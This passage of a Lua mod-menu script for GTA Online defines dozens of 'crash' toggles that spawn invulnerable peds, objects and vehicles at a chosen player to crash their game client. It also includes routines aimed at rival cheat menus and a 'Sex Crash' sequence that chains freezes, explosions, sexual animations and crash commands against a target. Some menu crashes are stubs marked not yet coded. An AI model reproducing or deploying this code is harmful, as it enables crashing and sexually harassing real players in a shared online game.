    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Barbell Crash", {"barbellcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("A_F_M_BodyBuild_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSCLE_FREE_WEIGHTS", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_barbell_02") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Hammers", {"nohammers"}, "Sends Hammers crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Hammers Crash", {"hammercrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_construct_02")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_HAMMERING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_hammer") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Fishing Rods", {"norods"}, "Sends Fishing crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Fishing Crash", {"fishingcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_m_cntrybar_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_STAND_FISHING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_fishing_rod_02") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Jack Hammmers", {"nojacks"}, "Sends Jack Hammmer crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Jack Hammmer Crash", {"jackhammercrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_construct_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_CONST_DRILL", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_jackham") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Brooms", {"nobrooms"}, "Sends Broom crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Broom Crash", {"broomcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("csb_janitor")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_JANITOR", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_broom") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Russian Drunks", {"nodrunks"}, "Sends Russian Drunk crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Russian Drunk Crash", {"drunkcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("ig_russiandrunk")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_DRINKING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_amb_40oz_02") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Trowels", {"notrowels"}, "Sends Trowel crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Trowel Crash", {"trowelcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_m_gardener_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_GARDENER_PLANT", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_cs_trowel") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Window Cleans", {"nowincleans"}, "Sends Window Clean crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Window Clean Crash", {"wincleancrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_winclean_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MAID_CLEAN", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_rag_01") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Torches", {"notorches"}, "Sends Torch crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Torch Crash", {"torchcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_chef_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_WELDING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_weld_torch") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Coffee Cups", {"nocoffeecups"}, "Sends Coffee crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Coffee Crash", {"coffeecrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_chef_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_DRINKING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("p_amb_coffeecup_01") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local SexCrashes = menu.list(Removals_List, "Sex Crashes", {"sexcrashes"}, "Spawns sex animations next to them before crashing")


local function RequestModel(Hash, timeout)
    STREAMING.REQUEST_MODEL(Hash)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not STREAMING.HAS_MODEL_LOADED(Hash) do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(Hash)
end
local function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControlOfEnt(entity)
            entities.delete_by_handle(entity)
        end
    end
end
local function CreateObject(Hash, Pos, static)
    RequestModel(Hash)
    local Object = entities.create_object(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Object, (static or false))
    return Object
end

    local selecteddildo = 3831526183
    local all_dildos = {
                    3831526183,
                    3563705146,
                    2314354252,
                    2009373169,
                    2373371221,
                    1333481871,
                    3872089630
                    } 

    local dildo_names = {
                    "v_res_d_dildo_a",
                    "v_res_d_dildo_b",
                    "v_res_d_dildo_c",
                    "v_res_d_dildo_d",
                    "v_res_d_dildo_e",
                    "v_res_d_dildo_f",
                    "prop_cs_dildo_01"
                    }
                    
    local amount = 200
    local delay = 100

    menu.slider(SexCrashes, "Spawn Amount", {"spawnammount"}, "", 0, 2500, amount, 50, function(val)
        amount = val
    end)

    menu.slider(SexCrashes, "Spawn Delay", {"spawndelay"}, "", 0, 500, delay, 10, function(val)
        delay = val
    end)

    menu.list_select(SexCrashes, "Dildos Model", {"dildomodel"}, "", dildo_names, 1, function(val)
        selecteddildo = all_dildos[val]
    end)
    
    menu.toggle_loop(SexCrashes, "Rain Dildos", {"rainodildos"}, "", function()
        local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
        local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped, true)
        local objects = {}
        for i = 1, amount do
            if not players.exists(pid) then
                break
            end
            ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
            ppos.x = ppos.x + math.random(-1, 1)
            ppos.y = ppos.y + math.random(-1, 1)
            objects[#objects+1] = CreateObject(selecteddildo, ppos)
            FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 1.0, false, true, 0.0, false)
            util.yield(delay)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(selecteddildo)
        if players.exists(pid) then
            util.yield(2500)
        end
        ClearEntities(objects)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, false, false)
        util.yield(50)
        local allobjs = entities.get_all_objects_as_handles()
        for i, object in ipairs(allobjs) do
            if ENTITY.GET_ENTITY_MODEL(object) == 3026082634 or ENTITY.GET_ENTITY_MODEL(object) == selecteddildo then
                entities.delete_by_handle(object)
            end
        end
        util.yield(50)
        util.toast("[Dildo Rain] Finished.")
    end)

    menu.divider(SexCrashes, "_________________________________________")

    menu.action(SexCrashes, "AUUUUGH", {"augh"}, "Uses jacknoiseboost, attachallnearby, fsexmoan ,msexmoan and constructipede", function()
        menu.trigger_commands("jacknoiseboost" .. players.get_name(pid))
        menu.trigger_commands("attachallnearby" .. players.get_name(pid))
        menu.trigger_commands("fsexmoan" .. players.get_name(pid))
        menu.trigger_commands("msexmoan" .. players.get_name(pid))
        menu.trigger_commands("constructipede" .. players.get_name(pid))
        util.yield(3000)
        menu.trigger_commands("jacknoiseboost" .. players.get_name(pid))
        menu.trigger_commands("attachallnearby" .. players.get_name(pid))
        menu.trigger_commands("fsexmoan" .. players.get_name(pid))
        menu.trigger_commands("msexmoan" .. players.get_name(pid))
        menu.trigger_commands("constructipede" .. players.get_name(pid))
    end)

    menu.toggle(SexCrashes, "AUUUUGH", {"toggleaugh"}, "Toggles jacknoiseboost, attachallnearby, fsexmoan ,msexmoan and constructipede", function(on)
            if on then
            menu.trigger_commands("jacknoiseboost" .. players.get_name(pid))
            menu.trigger_commands("attachallnearby" .. players.get_name(pid))
            menu.trigger_commands("fsexmoan" .. players.get_name(pid))
            menu.trigger_commands("msexmoan" .. players.get_name(pid))
            menu.trigger_commands("constructipede" .. players.get_name(pid))
        else
            menu.trigger_commands("jacknoiseboost" .. players.get_name(pid))
            menu.trigger_commands("attachallnearby" .. players.get_name(pid))
            menu.trigger_commands("fsexmoan" .. players.get_name(pid))
            menu.trigger_commands("msexmoan" .. players.get_name(pid))
            menu.trigger_commands("constructipede" .. players.get_name(pid))
        end
    end)

    menu.divider(SexCrashes, "_________________________________________")

menu.action(SexCrashes,"Sex Crash", {"sexcrash"}, "Note: Make sure they are stood still if you think freezing wont work. Credits to Legy for idea.", function()
    menu.trigger_commands("freeze" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(10)
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(10)
    menu.trigger_commands("attachto" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(200)
    menu.trigger_commands("dancingtopless" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(10)
    menu.trigger_commands("fsexmoan")
    util.yield(10)
    menu.trigger_commands("msexmoan")
    util.yield(10)
    menu.trigger_commands("animlapdance1")
    menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("pipebomb" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("smash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("ngcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("footlettuce" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(5000)
    menu.trigger_commands("attachto" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("cancelanim")
end)

local MenuCrashes = menu.list(Removals_List, "Menu Crashes", {"menucrashes"}, "Crash specific menus. (BETA).")


menu.toggle_loop(MenuCrashes,"Stand Crash", {"standcrash"}, "Use Ka-Chow.", function()
    if pid ~= players.user() then
    util.toast("Stand Crash Sent to " .. players.get_name(pid))
    util.log("Stand Crash Sent to " .. players.get_name(pid))
    util.toast(":/ Failed to crash as this is not coded yet :/ ")
    end
end)

menu.toggle_loop(MenuCrashes,"2Take1 Crash", {"2take1crash"}, "Use Ka-Chow.", function()
    if pid ~= players.user() then
    util.toast("2Take1 Crash Sent to " .. players.get_name(pid))
    util.log("2Take1 Crash Sent to " .. players.get_name(pid))
    util.toast(":/ Failed to crash as this is not coded yet :/ ")
    end
end)

menu.toggle_loop(MenuCrashes,"X-Force Crash", {"xforcecrash"}, "Use Ka-Chow.", function()
    if pid ~= players.user() then
    util.toast("X-Force Crash Sent to " .. players.get_name(pid))
    util.log("X-Force Crash Sent to " .. players.get_name(pid))
    util.toast(":/ Failed to crash as this is not coded yet :/ ")
    end
end)

menu.toggle_loop(MenuCrashes,"Rebound Crash", {"reboundcrash"}, "Working.", function()
    if pid ~= players.user() then
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("taxi")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    util.toast("Rebound Crash Sent to " .. players.get_name(pid))
    util.log("Rebound Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"Cherax Crash", {"cheraxcrash"}, "Working.", function()
    if pid ~= players.user() then
    menu.trigger_commands("pipebomb" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("pipebomb" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("pipebomb" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("pipebomb" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield()
    util.toast("Cherax Crash Sent to " .. players.get_name(pid))
    util.log("Cherax Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"North Crash", {"northcrash"}, "Working.", function()
    if pid ~= players.user() then
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local michael = util.joaat("player_zero")
    while not STREAMING.HAS_MODEL_LOADED(michael) do
        STREAMING.REQUEST_MODEL(michael)
        util.yield()
    end
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(ped)
    util.toast("North Crash Sent to " .. players.get_name(pid))
    util.log("North Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"Nightfall Crash", {"nightfallcrash"}, "Use Ka-Chow. Or rebound Master Crash Or Flipper Crash.", function()
    if pid ~= players.user() then
    util.toast("Nightfall Crash Sent to " .. players.get_name(pid))
    util.log("Nightfall Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"Kiddions Crash", {"kiddionscrash"}, "Working. LMFAO", function()
    if pid ~= players.user() then
    menu.trigger_commands("pipebomb" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield()
    util.toast("Kiddions Crash Sent to " .. players.get_name(pid))
    util.log("Kiddions Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes, "Any Menu Crash", {"anymenucrash"}, "Working.", function()
    menu.trigger_commands("servicekachow" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " firetruk")
    menu.trigger_commands("tpallentitiesloop" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("attachallnearby" .. PLAYER.GET_PLAYER_NAME(pid))
    util.toast("Any Menu Crash Sent to " .. players.get_name(pid))
    util.log("Any Menu Crash Sent to " .. players.get_name(pid))
end)


-----------------------------------------------------------------------------------------------------------------------------------------------------------

local craftcrashing = menu.list(Removals_List, "Vehicle Crashes", {}, "")


menu.toggle_loop(craftcrashing, "Teleport ALL Entit to Player Loop", {"tpallentitiesloop"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
	if on_toggle then
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    else
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    end
end)


local spawnDistance1 = 0
local vehicleType1 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected1 = 1
local spawnedPlanes1 = {}

menu.toggle_loop(craftcrashing, "Start Loop 1", {"craftloop1"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType1[selected1])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
